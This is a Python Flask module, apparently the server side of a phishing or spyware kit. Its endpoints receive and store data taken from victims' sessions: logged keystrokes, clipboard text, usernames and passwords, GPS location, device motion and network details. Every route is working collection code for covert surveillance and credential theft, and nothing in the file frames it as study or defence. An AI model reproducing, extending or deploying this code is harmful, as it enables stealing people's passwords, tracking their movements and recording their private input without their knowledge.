from flask import Blueprint, request, jsonify
from datetime import datetime
import base64, os, json
from app.config import Config
from app.database import db
from app.models import Session, Keylog, Credential, Event

bp = Blueprint("intel", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


@bp.route("/key", methods=["POST"])
def keylog():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    k = Keylog(session_ts=ts, key=p.get("key", "")[:255], target=p.get("target", "")[:64])
    db.session.add(k)
    s = Session.query.filter_by(ts=ts).first()
    if s:
        s.keylog_count = (s.keylog_count or 0) + 1
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/clipboard", methods=["POST"])
def clipboard():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    text = (p.get("text") or "")[:5000]
    fname = ts + "_clip_" + str(int(datetime.now().timestamp())) + ".txt"
    with open(os.path.join(Config.CLIPBOARD_DIR, fname), "w", encoding="utf-8") as f:
        f.write(text)
    e = Event(session_ts=ts, event_type="clipboard", data=json.dumps({"text": text[:500]}))
    db.session.add(e)
    s = Session.query.filter_by(ts=ts).first()
    if s:
        s.clipboard_count = (s.clipboard_count or 0) + 1
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/credential", methods=["POST"])
def credential():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    c = Credential(session_ts=ts, username=p.get("username", "")[:255],
                    password=p.get("password", "")[:255], source=p.get("source", "unknown")[:64])
    db.session.add(c)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/location", methods=["POST"])
def location():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    fname = ts + "_track.jsonl"
    path = os.path.join(Config.TRACKING_DIR, fname)
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps({"t": datetime.now().isoformat(), "lat": p.get("lat"),
                            "lon": p.get("lon"), "acc": p.get("acc")}) + "\n")
    return jsonify({"ok": True})


@bp.route("/motion", methods=["POST"])
def motion():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type="motion", data=json.dumps(p.get("data") or {}))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/network", methods=["POST"])
def network():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type="network", data=json.dumps(p.get("data") or {}))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})
